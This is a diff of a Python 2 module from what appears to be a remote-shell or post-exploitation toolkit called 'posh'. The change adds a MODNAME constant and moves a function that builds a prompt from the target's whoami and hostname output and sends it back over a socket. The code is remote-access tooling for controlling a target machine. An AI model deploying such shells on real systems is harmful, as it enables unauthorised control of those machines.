@@ -5,6 +5,7 @@ import os
 import select
 import subprocess as sp
 
+MODNAME = 'shell'
 POSH_PROMPT = 'posh > '
 USAGE = """Remote shell on target.
 usage: shell [-h]
@@ -12,7 +13,7 @@ usage: shell [-h]
 -h\t\tshow help"""
 
 
-@module.server_handler('shell')
+@module.server_handler(MODNAME)
 def server_shell(server, argv):
     if len(argv) > 1:
         print USAGE
@@ -57,20 +58,7 @@ target. Continue? (y/n)""",
             continue
 
 
-@module.client_handler('getprompt')
-def get_prompt(client, argv):
-    """Create shell prompt.
-
-    Using current user and hostname, create shell prompt for server `shell'
-    command.
-    """
-    user = client.cmd_exec('whoami').strip()
-    hn = client.cmd_exec('hostname').strip()
-    end = '#' if user == 'root' else '$'
-    client.s.send('{}@{} {} '.format(user, hn, end))
-
-
-@module.client_handler('shell')
+@module.client_handler(MODNAME)
 def client_shell(client, inp):
     """Posh `shell' command client-side.
 
@@ -112,3 +100,16 @@ def client_shell(client, inp):
                     proc.terminate()
                     client.s.send('shelldone')
                     return
+
+
+@module.client_handler('getprompt')
+def get_prompt(client, argv):
+    """Create shell prompt.
+
+    Using current user and hostname, create shell prompt for server `shell'
+    command.
+    """
+    user = client.cmd_exec('whoami').strip()
+    hn = client.cmd_exec('hostname').strip()
+    end = '#' if user == 'root' else '$'
+    client.s.send('{}@{} {} '.format(user, hn, end))
